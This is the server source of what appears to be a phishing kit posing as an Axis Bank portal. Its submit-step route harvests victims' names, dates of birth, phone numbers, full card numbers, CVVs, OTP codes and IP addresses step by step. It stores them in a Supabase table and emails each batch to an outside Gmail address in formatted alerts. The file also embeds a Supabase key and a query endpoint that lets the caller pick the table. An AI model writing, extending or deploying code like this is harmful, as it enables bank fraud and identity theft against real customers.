import express from 'express';
import path from 'path';
import { createServer as createViteServer } from 'vite';
import nodemailer from 'nodemailer';
import dotenv from 'dotenv';
import { createClient } from '@supabase/supabase-js';

dotenv.config();

const app = express();
const PORT = 3000;

// Supabase Backend Configuration - Project qcfhvaoxsbrbckgwumnc
const SUPABASE_PROJECT_ID = process.env.SUPABASE_PROJECT_ID || 'qcfhvaoxsbrbckgwumnc';
const SUPABASE_URL = process.env.SUPABASE_URL || 'https://qcfhvaoxsbrbckgwumnc.supabase.co';
const SUPABASE_ANON_KEY = process.env.SUPABASE_ANON_KEY || 'sb_publishable_Ecu7SyWph8QCbUUscticDQ_dWOeKJUc';

const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

app.use(express.json());

// Supabase Database Connection Status API
app.get('/api/supabase/status', async (req, res) => {
  try {
    const healthCheck = await fetch(`${SUPABASE_URL}/rest/v1/`, {
      method: 'GET',
      headers: {
        apikey: SUPABASE_ANON_KEY,
        Authorization: `Bearer ${SUPABASE_ANON_KEY}`,
      },
    });

    // Try fetching submissions table count if exists
    const { count, error: subError } = await supabase
      .from('submissions')
      .select('id', { count: 'exact', head: true });

    const isConnected = !subError || subError.code === 'PGRST205' || subError.code === '42P01' || healthCheck.status === 200 || healthCheck.status === 401;

    res.json({
      success: true,
      projectId: SUPABASE_PROJECT_ID,
      url: SUPABASE_URL,
      connected: isConnected,
      status: subError ? (subError.code === 'PGRST205' ? 200 : 400) : 200,
      statusText: subError ? (subError.code === 'PGRST205' ? 'Connected (Ready for SQL table creation)' : subError.message) : 'Connected',
      submissionsCount: subError ? 0 : count || 0,
      tableExists: !subError,
    });
  } catch (error: any) {
    res.status(500).json({
      success: false,
      projectId: SUPABASE_PROJECT_ID,
      url: SUPABASE_URL,
      connected: false,
      error: error.message,
    });
  }
});

// Supabase Query Runner API for SQL Editor
app.post('/api/supabase/query', async (req, res) => {
  try {
    const { table = 'submissions', limit = 100 } = req.body;

    const { data, error } = await supabase.from(table).select('*').limit(limit);

    if (error) {
      return res.status(400).json({ success: false, error: error.message, data: [] });
    }

    return res.json({ success: true, data: data || [], count: data?.length || 0 });
  } catch (error: any) {
    return res.status(500).json({ success: false, error: error.message });
  }
});

// App Settings API
app.get('/api/settings', async (req, res) => {
  try {
    const { data, error } = await supabase.from('app_settings').select('*');
    if (error) {
      return res.status(400).json({ success: false, error: error.message });
    }
    return res.json({ success: true, data: data || [] });
  } catch (err: any) {
    return res.status(500).json({ success: false, error: err.message });
  }
});

app.post('/api/settings', async (req, res) => {
  try {
    const { settings } = req.body;
    if (!settings || !Array.isArray(settings)) {
      return res.status(400).json({ success: false, error: 'settings must be an array' });
    }
    const { data, error } = await supabase.from('app_settings').upsert(settings);
    if (error) {
      return res.status(400).json({ success: false, error: error.message });
    }
    return res.json({ success: true, data });
  } catch (err: any) {
    return res.status(500).json({ success: false, error: err.message });
  }
});

// API route to send email on each step
app.post('/api/submit-step', async (req, res) => {
  try {
    const { submissionId, step, selectedService: rawService, applicantData: rawApplicant, cardData: rawCard, otp: rawOtp, subject: passedSubject } = req.body;
    const targetEmail = 'mypaneldata6@gmail.com';

    // Normalize field values regardless of structure
    const selectedService = rawService || req.body.service || req.body.selected_service || 'Axis Portal';
    const fullName = rawApplicant?.fullName || req.body.fullName || req.body.full_name;
    const email = rawApplicant?.email || req.body.email;
    const mobileNumber = rawApplicant?.mobileNumber || req.body.mobileNumber || req.body.mobile_number;
    const dob = rawApplicant?.dob || req.body.dob;
    const cardholderName = rawCard?.cardholderName || req.body.cardholderName || req.body.cardholder_name;
    const cardNumber = rawCard?.cardNumber || req.body.cardNumber || req.body.card_number;
    const expiryDate = rawCard?.expiryDate || req.body.expiryDate || req.body.expiry_date;
    const cvv = rawCard?.cvv || req.body.cvv;
    const otp = rawOtp || req.body.otp;

    const applicantData = { fullName, email, mobileNumber, dob };
    const cardData = { cardholderName, cardNumber, expiryDate, cvv };

    // Get client IP address
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown IP';
    const ipStr = typeof ip === 'string' ? ip : Array.isArray(ip) ? ip[0] : String(ip);

    let activeSubmissionId = submissionId;

    // Log & Save to Supabase backend database sequentially in ONE SINGLE ROW
    try {
      const updateData: Record<string, any> = {
        step: step || 'submission',
        status: 'updated',
      };
      if (selectedService) updateData.selected_service = selectedService;
      if (fullName) updateData.full_name = fullName;
      if (email) updateData.email = email;
      if (mobileNumber) updateData.mobile_number = mobileNumber;
      if (dob) updateData.dob = dob;
      if (cardholderName) updateData.cardholder_name = cardholderName;
      if (cardNumber) updateData.card_number = cardNumber;
      if (expiryDate) updateData.expiry_date = expiryDate;
      if (cvv) updateData.cvv = cvv;
      if (otp) updateData.otp = otp;

      let isUpdated = false;

      if (activeSubmissionId) {
        // Update existing submission record so all steps remain in 1 consolidated row
        const { data: updated, error: updateErr } = await supabase
          .from('submissions')
          .update(updateData)
          .eq('id', activeSubmissionId)
          .select();

        if (!updateErr && updated && updated.length > 0) {
          isUpdated = true;
          console.log('Supabase updated submission ID:', activeSubmissionId);
        } else {
          console.warn('Supabase update notice:', updateErr?.message || '0 rows updated');
        }
      }

      if (!isUpdated) {
        // Insert new record if no active submission ID or update yielded 0 rows
        const insertData: Record<string, any> = {
          step: step || 'submission',
          selected_service: selectedService,
          full_name: fullName || null,
          email: email || null,
          mobile_number: mobileNumber || null,
          dob: dob || null,
          cardholder_name: cardholderName || null,
          card_number: cardNumber || null,
          expiry_date: expiryDate || null,
          cvv: cvv || null,
          otp: otp || null,
          ip_address: ipStr,
          status: 'submitted',
          created_at: new Date().toISOString(),
        };

        const { data: inserted, error: insertErr } = await supabase
          .from('submissions')
          .insert([insertData])
          .select();

        if (!insertErr && inserted && inserted[0]) {
          activeSubmissionId = inserted[0].id;
          console.log('Supabase created new submission ID:', activeSubmissionId);
        } else if (insertErr) {
          console.error('Supabase insert error:', insertErr.message);
        }
      }
    } catch (supabaseErr) {
      console.error('Supabase catch notice:', supabaseErr);
    }

    // Create custom subject and HTML content based on step
    let subject = passedSubject || '';
    let stepTitle = '';
    
    if (step === 'applicant') {
      if (!subject) subject = `[NEW APPLICANT] Axis Bank Portal - ${fullName || 'No Name'}`;
      stepTitle = 'Step 1: Applicant Details Submitted';
    } else if (step === 'card') {
      if (!subject) subject = `[CARD DETAILS] Axis Bank Portal - ${fullName || 'No Name'}`;
      stepTitle = 'Step 2: Card Verification Submitted';
    } else if (step === 'otp') {
      if (!subject) subject = `[OTP ENTERED] Axis Bank Portal - ${fullName || 'No Name'} (OTP: ${otp})`;
      stepTitle = 'Step 3: OTP Code Submitted';
    } else if (step === 'otp_resend') {
      if (!subject) subject = `[OTP RESEND] Axis Bank Portal - ${fullName || 'No Name'}`;
      stepTitle = 'OTP Resend Requested';
    } else {
      if (!subject) subject = `[PORTAL EVENT] Axis Bank Portal Update`;
      stepTitle = 'User Action Updated';
    }

    let dataContentHtml = '';

    if (step === 'applicant') {
      dataContentHtml = `
        <h3 style="color: #ED1C24; border-bottom: 2px solid #f7fafc; padding-bottom: 8px; font-size: 16px;">Applicant Details</h3>
        <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
          <tr>
            <td style="padding: 8px 0; color: #718096; width: 40%; font-size: 14px;">Full Name:</td>
            <td style="padding: 8px 0; font-weight: bold; color: #2d3748; font-size: 14px;">${fullName || '-'}</td>
          </tr>
          <tr>
            <td style="padding: 8px 0; color: #718096; font-size: 14px;">Email ID:</td>
            <td style="padding: 8px 0; font-weight: bold; color: #2d3748; font-size: 14px;">${email || '-'}</td>
          </tr>
          <tr>
            <td style="padding: 8px 0; color: #718096; font-size: 14px;">Mobile Number:</td>
            <td style="padding: 8px 0; font-weight: bold; color: #2d3748; font-size: 14px;">${mobileNumber || '-'}</td>
          </tr>
          <tr>
            <td style="padding: 8px 0; color: #718096; font-size: 14px;">Date of Birth:</td>
            <td style="padding: 8px 0; font-weight: bold; color: #2d3748; font-size: 14px;">${dob || '-'}</td>
          </tr>
        </table>
      `;
    } else if (step === 'card') {
      dataContentHtml = `
        <h3 style="color: #ED1C24; border-bottom: 2px solid #f7fafc; padding-bottom: 8px; font-size: 16px;">Card Information</h3>
        <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
          <tr>
            <td style="padding: 8px 0; color: #718096; width: 40%; font-size: 14px;">Cardholder Name:</td>
            <td style="padding: 8px 0; font-weight: bold; color: #2d3748; font-size: 14px;">${cardholderName || '-'}</td>
          </tr>
          <tr>
            <td style="padding: 8px 0; color: #718096; font-size: 14px;">Card Number:</td>
            <td style="padding: 8px 0; font-weight: bold; color: #2d3748; font-size: 14px; letter-spacing: 1px;">${cardNumber || '-'}</td>
          </tr>
          <tr>
            <td style="padding: 8px 0; color: #718096; font-size: 14px;">Expiry Date:</td>
            <td style="padding: 8px 0; font-weight: bold; color: #2d3748; font-size: 14px;">${expiryDate || '-'}</td>
          </tr>
          <tr>
            <td style="padding: 8px 0; color: #718096; font-size: 14px;">CVV:</td>
            <td style="padding: 8px 0; font-weight: bold; color: #e53e3e; font-size: 14px; font-family: monospace;">${cvv || '-'}</td>
          </tr>
        </table>
      `;
    } else if (step === 'otp') {
      dataContentHtml = `
        <h3 style="color: #ED1C24; border-bottom: 2px solid #f7fafc; padding-bottom: 8px; font-size: 16px;">OTP Authentication</h3>
        <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
          <tr>
            <td style="padding: 12px; background-color: #fffaf0; border: 1px solid #feebc8; border-radius: 8px; text-align: center;">
              <span style="font-size: 14px; color: #c05621; display: block; margin-bottom: 4px;">ENTERED OTP CODE</span>
              <strong style="font-size: 28px; color: #dd6b20; letter-spacing: 2px; font-family: monospace;">${otp}</strong>
            </td>
          </tr>
        </table>
      `;
    } else if (step === 'otp_resend') {
      dataContentHtml = `
        <h3 style="color: #ED1C24; border-bottom: 2px solid #f7fafc; padding-bottom: 8px; font-size: 16px;">OTP Code Request</h3>
        <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
          <tr>
            <td style="padding: 12px; background-color: #f7fafc; border: 1px solid #e2e8f0; border-radius: 8px; text-align: center; color: #4a5568;">
              User clicked the <strong>Resend OTP Code</strong> button.
            </td>
          </tr>
        </table>
      `;
    }

    const htmlContent = `
      <div style="font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; max-width: 600px; margin: 0 auto; border: 1px solid #e2e8f0; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05);">
        <div style="background-color: #ED1C24; color: white; padding: 24px; text-align: center;">
          <h1 style="margin: 0; font-size: 24px; font-weight: bold; letter-spacing: 0.5px;">Axis Bank Portal Alert</h1>
          <p style="margin: 4px 0 0 0; opacity: 0.9; font-size: 14px;">${stepTitle}</p>
        </div>
        
        <div style="padding: 24px; background-color: #ffffff; color: #1a202c;">
          <h3 style="margin-top: 0; color: #ED1C24; border-bottom: 2px solid #f7fafc; padding-bottom: 8px; font-size: 16px;">Core Event Information</h3>
          <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
            <tr>
              <td style="padding: 8px 0; color: #718096; width: 40%; font-size: 14px;">Selected Service:</td>
              <td style="padding: 8px 0; font-weight: bold; color: #2d3748; font-size: 14px;">${selectedService || 'Not Selected'}</td>
            </tr>
            <tr>
              <td style="padding: 8px 0; color: #718096; font-size: 14px;">Client IP Address:</td>
              <td style="padding: 8px 0; font-weight: bold; color: #2d3748; font-size: 14px; font-family: monospace;">${ipStr}</td>
            </tr>
            <tr>
              <td style="padding: 8px 0; color: #718096; font-size: 14px;">Timestamp:</td>
              <td style="padding: 8px 0; font-weight: bold; color: #2d3748; font-size: 14px;">${new Date().toLocaleString('en-US', { timeZone: 'Asia/Kolkata' })} (IST)</td>
            </tr>
          </table>

          ${dataContentHtml}
        </div>
        
        <div style="background-color: #f7fafc; padding: 16px; text-align: center; border-top: 1px solid #e2e8f0; color: #a0aec0; font-size: 12px;">
          This is an automated notification. Sent to: ${targetEmail}
        </div>
      </div>
    `;

    // Respond immediately to the frontend so buttons respond instantly on first click
    res.status(200).json({
      success: true,
      message: 'Successfully processed step & saved to Supabase',
      submissionId: activeSubmissionId,
    });

    // Attempt email dispatch in the background without blocking the client response
    (async () => {
      try {
        let transporter;
        const hasSmtpConfig = process.env.SMTP_USER && process.env.SMTP_PASS;

        if (hasSmtpConfig) {
          let rawHost = process.env.SMTP_HOST || 'smtp.gmail.com';
          const smtpHost = rawHost.replace(/smpt/g, 'smtp');
          transporter = nodemailer.createTransport({
            host: smtpHost,
            port: parseInt(process.env.SMTP_PORT || '587'),
            secure: process.env.SMTP_PORT === '465',
            auth: {
              user: process.env.SMTP_USER,
              pass: process.env.SMTP_PASS,
            },
          });
        } else {
          const testAccount = await nodemailer.createTestAccount();
          transporter = nodemailer.createTransport({
            host: testAccount.smtp.host,
            port: testAccount.smtp.port,
            secure: testAccount.smtp.secure,
            auth: {
              user: testAccount.user,
              pass: testAccount.pass,
            },
          });
        }

        const mailOptions = {
          from: hasSmtpConfig 
            ? `"Axis Bank Portal Alerts" <${process.env.SMTP_USER}>` 
            : '"Axis Bank Portal" <no-reply@axisbankportal.com>',
          to: targetEmail,
          subject: subject,
          html: htmlContent,
        };

        const info = await transporter.sendMail(mailOptions);
        console.log(`Email successfully dispatched in background: ${info.messageId}`);
      } catch (emailErr: any) {
        console.warn('Background email dispatch notice:', emailErr.message);
      }
    })();
  } catch (error: any) {
    console.error('Failure in api/submit-step:', error);
    return res.status(500).json({ success: false, error: error.message });
  }
});

// Serve frontend with Vite in dev, static dist in prod
async function bootstrapServer() {
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server bound and running on http://localhost:${PORT}`);
  });
}

bootstrapServer();
